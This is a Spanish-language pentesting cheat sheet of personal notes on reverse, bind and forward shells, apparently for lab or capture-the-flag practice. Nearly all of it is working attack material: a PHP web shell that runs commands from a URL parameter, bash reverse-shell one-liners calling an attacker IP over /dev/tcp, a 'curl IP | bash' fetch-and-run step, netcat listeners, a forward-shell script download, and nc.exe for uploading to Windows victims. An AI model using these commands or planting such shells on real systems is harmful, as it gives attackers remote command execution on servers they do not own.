# Diferentes tipos de ReverShell

Tags: #ReverShell #Comandos 

Tenemos diferntes tipos de [1 ReverShell](1%20ReverShell.md) en este pagina Web: [Monkey-Pentester](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## ReverShell, BindShell
Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
```php
❯ nano cmd.php

	<?php 
		echo "<prep>" . shell_exec($_GET['cmd']) . "</prep>";
	?>
```
Las etiquetas que usamos ahi son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahi pode colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de **Atacante**.

```bash
❯ nano index.html
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.2/443 0>&1

	# IP = IP de atacante
	# 443 = Puerto a usar

❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
```

ReverShell en php
```php
<?php
   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
?>

	# IP = IP de atacante
	# 443 = Puerto a usar
```

Para ponernos en escucha por Netcat en espera de la **ReverShell**:
1) Linux
2) Windows
```bash
❯ nc -nlvp 443 

❯ rlwrap nc -nlvp 443

	# nc = Netcat 
	# n = No DNS
	# l = Modo escucha, conexiones entrantes
	# v = verbose
	# p = numero local de puerto en esucha

```

Para ejecutar Netcat y hacer la **BindShell**: 
```bash
❯ nc IP-Victima 443
```

## ForwardShell

Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
```shell
❯ nano cmd.php
	<?php 
		echo shell_exec($_GET['cmd']);
	?>

```
Las etiquetas que usamos ahi son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahi pode colocar comandos y conectarmos a nuestra maquina de **Atacante** por una **ForwardShell**

Descargaremos el siguiente archivo y lo ejecutaremos con Pyhton3 para hacer una **ForwardShell**: 
Debemos estar en la pestana de **Raw**
* [Tty_Over_Http](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py)
```bash
❯ wget https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py

	# Descargarnos el archivo 'tty_over_html'
	# Cambiamos la parte de index.php por cmd.php (Dependiendo el servidor)

❯ python3 tty_over_http.py 
```


### Binario para Windows

Este .exe lo debemos de subir a la maquina victima en Windows
```bash
❯ /usr/share/Seclists/Web-Shells/FuzzDB/nc.exe           # Netcat .exe nos ayuda a conseguir una ReverShell en Windows
```